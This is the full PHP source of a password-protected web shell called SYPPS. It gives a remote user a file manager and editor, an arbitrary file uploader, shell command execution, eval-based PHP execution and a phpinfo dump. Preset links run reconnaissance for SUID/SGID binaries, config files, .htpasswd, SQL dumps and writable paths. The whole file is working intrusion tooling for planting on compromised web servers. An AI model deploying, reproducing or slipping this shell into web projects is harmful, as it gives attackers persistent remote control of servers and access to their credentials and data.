<?php
	#####################################################################################
	# SET A PASSWORD AND PEPPER VALUES ($pep1 / $pep2) HERE !!!
	#####################################################################################
	
	// PASSWORD
	$_PASS = "sypps";

	// PEPPER VALUES
	$pep1 = "5gv7#l!b0";
	$pep2 = "Z9wOzhP&E";

	#####################################################################################
	# SYPPS CODE - DO NOT CHANGE BLOW THAT LINE UNLASSE YOU KNOW WHAT YOU DO !!!
	#####################################################################################
	// Version
	$_VERS = "1.16";
	
	// Login
	$hash = hash("sha512", $pep1.$_PASS.$pep2);
	
	if($_POST['s'] == "dologin"){
		if(hash("sha512", $pep1.$_POST['pw'].$pep2) == $hash){
			$_COOKIE['sypps'] = $hash;
		}
	}

    // Check login-status 
	if($_COOKIE['sypps'] == $hash){
		setcookie("sypps", $_COOKIE['sypps'], time()+(60*60*24));
	}
	else{
		$_GET['s'] = "logout";
	}

    // Logout
	if($_GET['s'] == "logout"){
		unset($_COOKIE['sypps']);
		setcookie("sypps", "0", time()-(60*60*24));
		
		// Display Login-Form
		echo '<html><head><title>SYPPS</title></head>';
		echo '<body style="color: #EEE; background-color: #333; font-family: Courier, monospace;" onload="document.getElementById(\'pw\').focus();">';
			echo '<form method="post" action="'.basename(getenv("SCRIPT_FILENAME")).'">';
				echo '<input type="hidden" name="s" value="dologin">';
				echo 'SYPPS> login<br><br>';
				echo 'Enter password: ';
				echo '<input type="password" id="pw" name="pw" style="border: 0px; border-left: 12px solid #DDD; background-color: #333; padding: 3px; color: #333;">';
				echo '<input type="submit" style="width: 1px; height: 1px; border: 0px; background-color: #333;">';
			echo '</form>';
		echo '</body>';
		echo '</html>';
		die();
	}
	
	// _POST == _GET for some parameters that the standard case works again
	if(isset($_GET['lsdir'])){
		$_POST['lsdir'] = $_GET['lsdir'];
	}
	if(isset($_GET['cmd'])){
		$_POST['cmd'] = $_GET['cmd'];
	}
	
	// Save file
	if($_POST['save'] != ""){
		$_POST['fileCont'] .= "\n";
		if(file_put_contents($_POST['save'], $_POST['fileCont'])){
			$canSave = true;
			$_GET['edit'] = basename($_POST['save']);
		}
	}
?>

<!DOCTYPE html>
<html>
<head>
	<title>SYPPS</title>
	
	<link rel=stylesheet href="http://codemirror.net/lib/codemirror.css">
	<link rel=stylesheet href="http://codemirror.net/theme/base16-dark.css">
	<script src="http://codemirror.net/lib/codemirror.js"></script>
	<script src="http://codemirror.net/mode/xml/xml.js"></script>
	<script src="http://codemirror.net/mode/javascript/javascript.js"></script>
	<script src="http://codemirror.net/mode/css/css.js"></script>
	<script src="http://codemirror.net/mode/htmlmixed/htmlmixed.js"></script>
	<script src="http://codemirror.net/mode/clike/clike.js"></script>
	<script src="http://codemirror.net/mode/php/php.js"></script>
	<script src="http://codemirror.net/mode/python/python.js"></script>
	<script src="http://codemirror.net/mode/perl/perl.js"></script>
	
	<style>
		*{ margin: 0px; padding: 0px; }
		body{ color: #EEE; background-color: #333; font-family: "Courier New", Courier, monospace; }
		#head{ padding: 6px 16px; }
		#head small{ font-weight: 300; }
		textarea, input{ border: 1px solid #999; background-color: #444; margin-bottom: 10px; }
		hr{ margin-top: 5px; margin-bottom: 5px; border: 0px; border-top: 1px dotted #666; }
		.btn{ color: #fff; background-color: #000; border: 1px solid #666; padding: 2px 8px; font-weight: bold; }
		a{ color: #fff; text-decoration: none; font-weight: bold; }
		a:hover{ text-decoration: underline; }
		table{ border-spacing: 0px; border-collapse: collapse; }
		td{ vertical-align: top; padding: 3px 5px; }
		.dirLink{ color: #6191C5; }
		.cmdOutput{ color: #2BFF00; }
		.kbCol{ text-align: right; border-right: 40px solid #333; }
		.colLine{ background-color: #444; }
		
		div.tab { overflow: hidden; border: 1px solid #ccc; background-color: #f1f1f1; margin-bottom: 5px; }
		div.tab button { background-color: inherit; float: left; border: none; outline: none; cursor: pointer; padding: 14px 16px; transition: 0.3s; }
		div.tab button:hover { background-color: #ddd; }
		div.tab button.active { background-color: #ccc; }
		.tabcontent { display: none; padding: 6px 12px; border-top: none; }
		
		#Upload .txtDir,
		#Files .txtDir { width: 50%; color: #fff; padding: 2px 5px; }
		
		#Command .txtCmd { width: 90%; color: #fff; padding: 2px 5px; }
		
		#Files textarea{ width: 100%; height: calc(100vh - 50px); color: #fff; padding: 10px; }
		.CodeMirror{ height: calc(100vh - 50px) !important; border: 1px solid #999 !important; background-color: #444 !important; }
		.cm-s-base16-dark .CodeMirror-gutters{  background-color: #888 !important; }
		
		#PHP textarea,
		#EncDec textarea{ width: 100%; height: 120px; color: #fff; padding: 10px; }
		
		#EncDec table{ width: 100%; }
		#EncDec td textarea{ height: 22px; color: #fff; padding: 1px; }
		
		#PHPinfo { color: #222 !important; background-color: #fff; }
		#PHPinfo pre {margin: 0; font-family: monospace;}
		#PHPinfo a:link {color: #009; text-decoration: none; background-color: #fff;}
		#PHPinfo a:hover {text-decoration: underline;}
		#PHPinfo table {border-collapse: collapse; border: 0; width: 934px; box-shadow: 1px 2px 3px #ccc;}
		#PHPinfo .center {text-align: center;}
		#PHPinfo .center table {margin: 1em auto; text-align: left;}
		#PHPinfo .center th {text-align: center !important;}
		#PHPinfo td, th {color: #222 !important; border: 1px solid #666; font-size: 75%; vertical-align: baseline; padding: 4px 5px;}
		#PHPinfo h1 {font-size: 150%;}
		#PHPinfo h2 {font-size: 125%;}
		#PHPinfo .p {text-align: left;}
		#PHPinfo .e {background-color: #ccf; width: 300px; font-weight: bold;}
		#PHPinfo .h {background-color: #99c; font-weight: bold;}
		#PHPinfo .v {background-color: #ddd; max-width: 300px; overflow-x: auto; word-wrap: break-word;}
		#PHPinfo .v i {color: #999;}
		#PHPinfo img {float: right; border: 0;}
		#PHPinfo hr {width: 934px; background-color: #ccc; border: 0; height: 1px;}
	</style>
	<script>
		function openTab(evt, tabName) {
			var i, tabcontent, tablinks;
			tabcontent = document.getElementsByClassName("tabcontent");
			for (i = 0; i < tabcontent.length; i++) {
				tabcontent[i].style.display = "none";
			}
			tablinks = document.getElementsByClassName("tablinks");
			for (i = 0; i < tablinks.length; i++) {
				tablinks[i].className = tablinks[i].className.replace(" active", "");
			}
			document.getElementById(tabName).style.display = "block";
			evt.currentTarget.className += " active";
		}
	</script>
</head>

<?php
	if(substr(strtolower($_GET['edit']), -4) == ".php" OR substr(strtolower($_GET['edit']), -5) == ".php4" OR substr(strtolower($_GET['edit']), -5) == ".php5" OR substr(strtolower($_GET['edit']), -6) == ".phtml"){
		$_mode = "php";
	}
	elseif(substr(strtolower($_GET['edit']), -3) == ".js" OR substr(strtolower($_GET['edit']), -4) == ".htm" OR substr(strtolower($_GET['edit']), -5) == ".html"){
		$_mode = "javascript";
	}
	elseif(substr(strtolower($_GET['edit']), -4) == ".css"){
		$_mode = "css";
	}
	elseif(substr(strtolower($_GET['edit']), -3) == ".py"){
		$_mode = "python";
	}
	elseif(substr(strtolower($_GET['edit']), -3) == ".pl"){
		$_mode = "perl";
	}
	else{
		$_mode = "clike";
	}
?>
<body onload="var fileCont = document.getElementById('fileCont'); if(fileCont){ var myCodeMirror = CodeMirror.fromTextArea(fileCont, { lineNumbers: true, theme: 'base16-dark', lineWrapping: true, mode: '<?php echo $_mode; ?>' }); }">
	<h1 id="head"><b>SYPPS</b> <small>small yet powerful PHP shell v. <?php echo $_VERS; ?></small></h1>
	<div class="tab">
		<button class="tablinks" onclick="openTab(event, 'Files')"<?php if(isset($_POST['lsdir'])){ echo ' class="active"'; } ?>>File-Manager</button>
		<button class="tablinks" onclick="openTab(event, 'Upload')"<?php if(isset($_POST['upload'])){ echo ' class="active"'; } ?>>File-Uploader</button>
		<button class="tablinks" onclick="openTab(event, 'Command')"<?php if(isset($_POST['cmd'])){ echo ' class="active"'; } ?>>Command-Execution</button>
		<button class="tablinks" onclick="openTab(event, 'PHP')"<?php if(isset($_POST['php'])){ echo ' class="active"'; } ?>>PHP-Execution</button>
		<button class="tablinks" onclick="openTab(event, 'EncDec')"<?php if(isset($_POST['encDec'])){ echo ' class="active"'; } ?>>Encoder / Decoder</button>
		<button class="tablinks" onclick="openTab(event, 'PHPinfo')">PHP-Info</button>
		<button class="tablinks" onclick="openTab(event, 'Logout')">LOGOUT</button>
	</div>

	<div id="Welcome" class="tabcontent"<?php if($_POST['s'] == "dologin"){ echo ' style="display: block;"'; } ?>>
		<div class="cmdOutput">
			<h2>...happy SYPPSing!</h2>
		</div>
	</div>

	<div id="Files" class="tabcontent"<?php if(isset($_POST['lsdir'])){ echo ' style="display: block;"'; } ?>>
		<form method="post" enctype="multipart/form-data" action="<?php echo basename(getenv("SCRIPT_FILENAME")); ?>">
			List folder
			<?php 
				if($_POST['lsdir'] == ""){ 
					$_POST['lsdir'] = getcwd(); 
				} 
				$dir = realpath($_POST['lsdir']);
			?>
			<input type="text" class="txtDir" name="lsdir" value="<?php echo $dir; ?>">
			<input type="submit" value="show..." class="btn">
		</form>
		<hr>
		<?php
			if(isset($_POST['lsdir'])){
				if(substr($dir, -1) == "/"){ $dir = substr($dir, 0, (strlen($dir) - 1)); }
				$dh  = opendir($dir);
				
				while (false !== ($filename = readdir($dh))) {
					$files[] = $filename;
				}

				sort($files);
				
				if($_GET['edit'] != ""){ echo '<table style="width: 49%; float: left;">'; }
				else{ echo '<table style="width: 90%; float: left;">'; }
				echo '<tr><td style="min-width: 50%;"><b>FILE</b></td> <td><b>OWNER</b></td> <td><b>GROUP</b></td> <td><b>PERM.</b></td> <td class="kbCol"><b>KB</b></td></tr>';
				
				foreach($files as $key => $file){
					$editable = false;
					$browsable = false;
					$perms = fileperms("$dir/$file");
					
					switch ($perms & 0xF000) {
						case 0xC000: // Socket
							$info = 's';
							break;
						case 0xA000: // Symbolic link
							$info = 'l';
							break;
						case 0x8000: // File
							$info = '-';
							$editable = true;
							
							// Image
							if(substr(strtolower($file), -4) == ".gif"){ $editable = false; }
							elseif(substr(strtolower($file), -4) == ".jpg"){ $editable = false; }
							elseif(substr(strtolower($file), -5) == ".jpeg"){ $editable = false; }
							elseif(substr(strtolower($file), -4) == ".png"){ $editable = false; }
							// Arcive
							elseif(substr(strtolower($file), -4) == ".zip"){ $editable = false; }
							elseif(substr(strtolower($file), -4) == ".rar"){ $editable = false; }
							elseif(substr(strtolower($file), -4) == ".bz2"){ $editable = false; }
							elseif(substr(strtolower($file), -4) == ".tar"){ $editable = false; }
							elseif(substr(strtolower($file), -3) == ".gz"){ $editable = false; }
							// Office
							elseif(substr(strtolower($file), -4) == ".pdf"){ $editable = false; }
							elseif(substr(strtolower($file), -4) == ".doc"){ $editable = false; }
							elseif(substr(strtolower($file), -4) == ".xls"){ $editable = false; }
							elseif(substr(strtolower($file), -4) == ".ppt"){ $editable = false; }
							elseif(substr(strtolower($file), -4) == ".rtf"){ $editable = false; }
							
							break;
						case 0x6000: // Block special
							$info = 'b';
							break;
						case 0x4000: // Directory
							$info = 'd';
							$browsable = true;
							break;
						case 0x2000: // Character special
							$info = 'c';
							break;
						case 0x1000: // FIFO pipe
							$info = 'p';
							break;
						default: // unknown
							$info = 'u';
					}

					// Owner
					$info .= (($perms & 0x0100) ? 'r' : '-');
					$info .= (($perms & 0x0080) ? 'w' : '-');
					$info .= (($perms & 0x0040) ?
								(($perms & 0x0800) ? 's' : 'x' ) :
								(($perms & 0x0800) ? 'S' : '-'));

					// Group
					$info .= (($perms & 0x0020) ? 'r' : '-');
					$info .= (($perms & 0x0010) ? 'w' : '-');
					$info .= (($perms & 0x0008) ?
								(($perms & 0x0400) ? 's' : 'x' ) :
								(($perms & 0x0400) ? 'S' : '-'));

					// Others
					$info .= (($perms & 0x0004) ? 'r' : '-');
					$info .= (($perms & 0x0002) ? 'w' : '-');
					$info .= (($perms & 0x0001) ?
								(($perms & 0x0200) ? 't' : 'x' ) :
								(($perms & 0x0200) ? 'T' : '-'));
					
					// Owner & Group name
					$owner = posix_getpwuid(fileowner("$dir/$file"));
					$group = posix_getgrgid(filegroup("$dir/$file"));
					
					// Size
					$kb = number_format(filesize("$dir/$file") / 1024, 2, ".", " ");
					
					if($editable){
						$file = '<a href="?lsdir='.urlencode($dir).'&edit='.urlencode($file).'">'.$file.'</a>';
					}
					elseif($browsable AND $file != "."){
						$file = '<a class="dirLink" href="?lsdir='.urlencode($dir).'/'.urlencode($file).'">'.$file.'/</a>';
					}
					
					if($key % 2 == 0){
						$TD = '<td>';
						$TD2 = '<td class="kbCol">';
					}
					else{
						$TD = '<td class="colLine">';
						$TD2 = '<td class="kbCol colLine">';
					}
					
					echo "<tr>$TD$file</td> $TD".$owner['name']."</td> $TD".$group['name']."</td> $TD<nobr>$info</nobr></td> $TD2<nobr>$kb</nobr></td></tr>";
				}
				echo '</table>';
				
				if($_GET['edit'] != ""){ 
					echo '<form method="post" style="width: 49%; float: left;" action="'.basename(getenv("SCRIPT_FILENAME")).'?edit='.urlencode($_GET['edit']).'">';
						echo '<input type="hidden" name="lsdir" value="'.$_POST['lsdir'].'">';
						echo '<input type="text" class="txtDir" name="save" value="'.$_POST['lsdir'].'/'.$_GET['edit'].'"> ';
						echo '<input type="submit" class="btn" value="save..."> ';
						
						// Save file
						if($_POST['save'] != ""){
							if($canSave){
								echo " <b>saved!</b>";
							}
							else{
								echo '<b style="color: #C00;"> can\'t save!</b>';
							}
						}
						
						// Read file
						if($_GET['edit'] != "" AND $_GET['edit'] != "newFile"){
							if(!$_POST['fileCont'] = @file_get_contents($_POST['lsdir']."/".$_GET['edit'])){
								echo "Sorry, Can't read file! :(";
							}
						}
						
						echo '<div class="Codemirror"><textarea id="fileCont" class="codemirror-textarea fileCont" name="fileCont">'.htmlspecialchars($_POST['fileCont']).'</textarea></div>';
					echo '</form>';
				}
				else{
					echo '<div style="width: 9%; float: left;">';
						echo '<a href="?lsdir='.urlencode($dir).'&edit=newFile">CREATE <br>new file</a>';
					echo '</div>';
				}
			}
		?>
	</div>

	<div id="Upload" class="tabcontent"<?php if(isset($_POST['upload'])){ echo ' style="display: block;"'; } ?>>
		<form method="post" enctype="multipart/form-data" action="<?php echo basename(getenv("SCRIPT_FILENAME")); ?>">
			Upload
			<input type="file" name="newFile">
			to folder
			<?php if($_POST['dir'] == ""){ $_POST['dir'] = getcwd(); } ?>
			<input type="text" class="txtDir" name="dir" value="<?php echo $_POST['dir']; ?>">
			<input type="submit" value="go..." class="btn" name="upload">
		</form>
		
		<div class="cmdOutput">
		<?php
			@ini_set('upload_max_filesize', '32M');
			@ini_set('post_max_size', '64M');
			echo "<small>PHP say: upload_max_filesize = <b>".ini_get('upload_max_filesize')."</b>, post_max_size = <b>". ini_get('post_max_size')."</b></small>";
		?>
		</div>
		<hr>
		<?php
			if(isset($_POST['upload'])){
				$target_dir = $_POST['dir'];
				$target_file = "$target_dir/".basename($_FILES["newFile"]["name"]);
				if(@move_uploaded_file($_FILES["newFile"]["tmp_name"], $target_file)) {
					echo "The file has been uploaded to: <br>$target_file";
				} 
				else {
					echo "Can't upload your file to $target_dir :(";
				}
			}
		?>
	</div>

	<div id="Command" class="tabcontent"<?php if(isset($_POST['cmd'])){ echo ' style="display: block;"'; } ?>>
		<small>
			<a href="?cmd=<?php echo urlencode("find / -type f -perm -04000 -ls"); ?>">Find SUID files</a> | 
			<a href="?cmd=<?php echo urlencode("find / -type f -perm -02000 -ls"); ?>">Find SGID files</a> | 
			<a href="?cmd=<?php echo urlencode("find / -type f -iname \"*config*\""); ?>">Find *config*</a> | 
			<a href="?cmd=<?php echo urlencode("find / -perm -2 -ls"); ?>">Find writeable dirs and files</a> | 
			<a href="?cmd=<?php echo urlencode("find / -name .htaccess"); ?>">Find .htaccess</a> | 
			<a href="?cmd=<?php echo urlencode("find / -name .htpasswd"); ?>">Find .htpasswd</a> | 
			<a href="?cmd=<?php echo urlencode("find / -iname \"*.bak\""); ?>">Find *.bak</a> | 
			<a href="?cmd=<?php echo urlencode("find / -iname \"*.sql\""); ?>">Find *.sql</a> | 
			<a href="?cmd=<?php echo urlencode("netstat -a"); ?>">Netstat</a> | 
			<a href="?cmd=<?php echo urlencode('id; echo " "; echo "-----------------------------------------------"; echo " "; uname -a; echo " "; lscpu; echo " "; lsmod; echo " "; echo "-----------------------------------------------"; echo " "; df -h; echo " "; mount; echo " "; lsblk; echo " "; cat /proc/partitions; echo " "; echo "-----------------------------------------------"; echo " "; free -h; echo " "; cat /proc/meninfo; echo " "; echo "-----------------------------------------------"; echo " "; lshw; hwinfo --short; echo " "; echo "-----------------------------------------------"; echo " "; ifconfig -a; echo " "; echo "RESOLV.CONF:"; cat /etc/resolv.conf; echo " "; echo "HOSTS-FILE:"; cat /etc/hosts; echo " "; echo "-----------------------------------------------"; echo " "; ps -aux; echo " "; echo "-----------------------------------------------"; echo " ";'); ?>">Sysinfo</a>
		</small>
		<br><br>
		<form method="post" action="<?php echo basename(getenv("SCRIPT_FILENAME")); ?>">
			<input type="text" name="cmd" class="txtCmd" value="<?php echo htmlspecialchars($_POST['cmd']); ?>">
			<input type="submit" value="run..." class="btn">
		</form>
		<hr>
		<div class="cmdOutput">
		<?php
			if(isset($_POST['cmd'])){
				$out = false;
				$out = @shell_exec($_POST['cmd']);
				if($out){ echo "<pre>".htmlspecialchars($out)."</pre>"; }
				else{
					$out = @system($_POST['cmd'], $retVal);
					if($out){ echo "<pre>".htmlspecialchars($out)."</pre>"; }
					else{
						$out = @exec($_POST['cmd']);
						if($out){ echo "<pre>".htmlspecialchars($out)."</pre>"; }
						else{
							echo "Can't run ".$_POST['cmd'];
						}
					}
				}
			}
		?>
		</div>
	</div>

	<div id="PHP" class="tabcontent"<?php if(isset($_POST['php'])){ echo ' style="display: block;"'; } ?>>
		<form method="post" action="<?php echo basename(getenv("SCRIPT_FILENAME")); ?>">
			<textarea name="php"><?php echo $_POST['php']; ?></textarea>
			<input type="submit" value="run..." class="btn">
		</form>
		<hr>
		<div class="cmdOutput">
		<?php
			if(isset($_POST['php'])){ eval($_POST['php']); }
		?>
		</div>
	</div>

	<div id="EncDec" class="tabcontent"<?php if(isset($_POST['encDec'])){ echo ' style="display: block;"'; } ?>>
		<form method="post" action="<?php echo basename(getenv("SCRIPT_FILENAME")); ?>">
			<textarea type="text" name="encDec"><?php echo htmlspecialchars($_POST['encDec']); ?></textarea>
			<input type="submit" value="run..." class="btn">
		</form>
		<hr>
		<?php
			echo '<table>';
				echo '<tr><td><b>URLENCODE:</b></td> <td><textarea>'.urlencode($_POST['encDec']).'</textarea></td></tr>';
				echo '<tr><td><b>URLDECODE:</b></td> <td><textarea>'.urldecode($_POST['encDec']).'</textarea></td></tr>';
				echo '<tr><td style="width: 220px;">&nbsp;</td> <td>&nbsp;</td></tr>';
				
				echo '<tr><td><b>BASE64 ENCODE:</b></td> <td><textarea>'.base64_encode($_POST['encDec']).'</textarea></td></tr>';
				echo '<tr><td><b>BASE64 DECODE:</b></td> <td><textarea>'.base64_decode($_POST['encDec']).'</textarea></td></tr>';
				echo '<tr><td colspan="2">&nbsp;</td></tr>';
				
				echo '<tr><td><b>MD5:</b></td> <td><textarea>'.md5($_POST['encDec']).'</textarea></td></tr>';
				echo '<tr><td><b>CRYPT:</b></td> <td><textarea>'.crypt($_POST['encDec']).'</textarea></td></tr>';
				echo '<tr><td><b>SHA1:</b></td> <td><textarea>'.sha1($_POST['encDec']).'</textarea></td></tr>';
				echo '<tr><td><b>CRC32:</b></td> <td><textarea>'.crc32($_POST['encDec']).'</textarea></td></tr>';
			echo '</table>';
		?>
	</div>

	<div id="PHPinfo" class="tabcontent">
		<?php 
			ob_start();
			phpinfo();
			$pinfo = ob_get_contents();
			ob_end_clean();

			$pinfo = preg_replace( '%^.*<body>(.*)</body>.*$%ms','$1',$pinfo);
			echo $pinfo;
		?>
	</div>

	<div id="Logout" class="tabcontent">
		SYPPS> <a href="?s=logout">logout</a>
	</div>
</body>
</html>
